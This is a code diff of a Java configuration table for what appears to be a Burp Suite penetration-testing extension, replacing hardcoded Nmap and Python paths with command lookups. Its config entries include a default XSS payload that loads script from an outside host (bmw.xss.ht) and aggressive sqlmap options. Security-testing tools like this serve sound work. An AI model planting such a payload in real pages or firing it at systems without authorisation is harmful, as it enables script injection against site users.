@@ -25,16 +25,11 @@ public class ConfigTableModel extends AbstractTableModel{
 			"Key", "Value", "Type", "Enable", "Comment"
 	};
 	
-	public static final String Nmap_Mac = "/usr/local/bin/nmap";
-	public static final String Nmap_Windows = "D:\\Program Files (x86)\\Nmap\\nmap.exe";
 	public static final String Firefox_Mac = "/Applications/Firefox.app/Contents/MacOS/firefox";
 	public static final String Firefox_Windows = "D:\\Program Files\\Mozilla Firefox\\firefox.exe";
 	
 	public static final String SQLMap_Mac = "/usr/local/bin/sqlmap-dev/sqlmap.py";
 	public static final String SQLMap_Windows = "D:\\Program Files (x86)\\sqlmap-dev\\sqlmap.py";
-	
-	public static final String Python_Mac = "/usr/bin/python";
-	public static final String Python_Windows = "C:\\python27\\python.exe";
 	
 	public static final String TempDir_Mac = "/tmp";
 	public static final String TempDir_Windows = "D:\\sqlmap-request-files";
@@ -54,22 +49,18 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));
 		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));
 
+		configEntries.add(new ConfigEntry("SQLMap-Python-Path",Utils.isCommandExists("python"),ConfigEntry.Config_Basic_Variable,false,false));
 		if (Utils.isMac()) {
-			configEntries.add(new ConfigEntry("SQLMap-Python-Path",Python_Mac,ConfigEntry.Config_Basic_Variable,false,false));
 			configEntries.add(new ConfigEntry("SQLMap-SQLMap.py-Path",SQLMap_Mac,ConfigEntry.Config_Basic_Variable,false,false));
 			configEntries.add(new ConfigEntry("SQLMap-Request-File-Path",TempDir_Mac,ConfigEntry.Config_Basic_Variable,true,false));
 		}else {
-			configEntries.add(new ConfigEntry("SQLMap-Python-Path",Python_Windows,ConfigEntry.Config_Basic_Variable,false,false));
 			configEntries.add(new ConfigEntry("SQLMap-SQLMap.py-Path",SQLMap_Windows,ConfigEntry.Config_Basic_Variable,false,false));
 			configEntries.add(new ConfigEntry("SQLMap-Request-File-Path",TempDir_Windows,ConfigEntry.Config_Basic_Variable,true,false));
 		}
 		
 		configEntries.add(new ConfigEntry("SQLMap-Options","--risk=3 --level=3",ConfigEntry.Config_Basic_Variable,true,false));
-		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
-			configEntries.add(new ConfigEntry("Nmap-File-Path",Nmap_Mac,ConfigEntry.Config_Basic_Variable,true,false));
-		}else {
-			configEntries.add(new ConfigEntry("Nmap-File-Path",Nmap_Windows,ConfigEntry.Config_Basic_Variable,true,false));
-		}
+		
+		configEntries.add(new ConfigEntry("Nmap-File-Path",Utils.isCommandExists("nmap"),ConfigEntry.Config_Basic_Variable,true,false));
 		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
 			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,"this config effect sqlmap and nmap"));
 		}else {
